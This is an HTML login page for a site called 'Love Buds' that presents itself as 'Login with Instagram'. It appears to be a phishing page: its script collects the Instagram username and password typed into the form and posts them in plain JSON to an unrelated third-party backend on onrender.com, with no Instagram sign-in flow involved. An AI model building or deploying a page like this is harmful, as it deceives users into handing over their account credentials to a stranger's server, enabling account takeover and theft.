<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login - Love Buds</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="login.css">
</head>
<body>

  <main class="login-container">
    <h1 class="login-title">Login with Instagram</h1>

    
    <form id="loginForm">
  <input type="text" placeholder="Username" name="username" required>
  <input type="password" placeholder="Password" name="password" required>
  <button type="submit">Login</button>
  <p id="message" class="form-message"></p> <!-- Message container -->
  <p class="back"><a href="index.html">← Back to Welcome</a></p>
  
</form>
  </main>

</body>
<script>
const form = document.getElementById("loginForm");
const messageEl = document.getElementById("message");

form.addEventListener("submit", async (e) => {
  e.preventDefault();

  const username = form.username.value.trim();
  const password = form.password.value.trim();

  if (!username || !password) return showMessage("Fill all fields", "error");

  try {
    const res = await fetch("https://lovebuds-backend-1.onrender.com/login-submit", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ username, password })
});
    

    const data = await res.text();
    

  if (res.ok) {
  sessionStorage.setItem("username", username); // ← add this line
  showMessage(data, "success");
  setTimeout(() => {
    window.location.href = "dashboard.html";
  }, 1200);
} else {
      showMessage(data, "error");
    }

    form.reset();

  } catch (err) {
    console.error(err);
    showMessage("Server error", "error");
  }
});

// Function to display message
function showMessage(msg, type) {
  messageEl.textContent = msg;
  messageEl.style.opacity = "1";

  if(type === "success") {
    messageEl.style.color = "#fff";
    messageEl.style.backgroundColor = "rgba(0,128,0,0.7)";
  } else {
    messageEl.style.color = "#fff";
    messageEl.style.backgroundColor = "rgba(255,0,0,0.7)";
  }

  messageEl.style.padding = "10px";
  messageEl.style.borderRadius = "8px";
  messageEl.style.marginTop = "15px";
  messageEl.style.transition = "opacity 0.5s ease";

  setTimeout(() => {
    messageEl.style.opacity = "0";
  }, 3000);
}
</script>
</html>
